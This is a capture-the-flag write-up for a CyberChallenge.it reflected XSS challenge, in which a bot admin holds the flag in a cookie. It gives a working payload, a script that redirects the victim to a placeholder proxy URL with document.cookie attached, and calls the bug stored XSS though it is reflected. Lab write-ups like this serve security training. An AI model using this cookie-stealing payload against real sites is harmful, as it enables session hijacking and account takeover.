# XSS1
## Description
In this challenge the user can report a URL to the admin of the server (in this case, the admin is just a bot that follows the link).
The flag is a cookie inside the admin's browser.

## Exploit
The type of exploit to use is self-explanatory, given the title of the challenge. Using the test textbox, and checking with the DevTools, the content of the textbox (which is sent as a param of a GET request) is directly injected in the ```<body>``` tag.
A way to exploit this would be to send at the admin a malicious URL, which redirects the admin to a reverse proxy and sending as a param of the request the cookies of the admin (a stored XSS, basically).
The payload I used is: ```http://xss1.challs.cyberchallenge.it/?html=%3Cscript%3Edocument.location=%22<your_proxy_url>?admin=%22%2Bdocument.cookie%3C/script%3E``` (the proxy I used is [Webhook.site](https://www.webhook.site/), but [ngrok](https://www.ngrok.com) is also valid).
As you can see, the admin loads its own page injected with this (URL decoded)script: ```http://xss1.challs.cyberchallenge.it/?html=<script>document.location="<your_proxy_url>?admin="+document.cookie</script>```, which redirects the admin to the proxy, with the admin's cookies as the "admin" param.
The flag will be in your proxy console, as an incoming request.
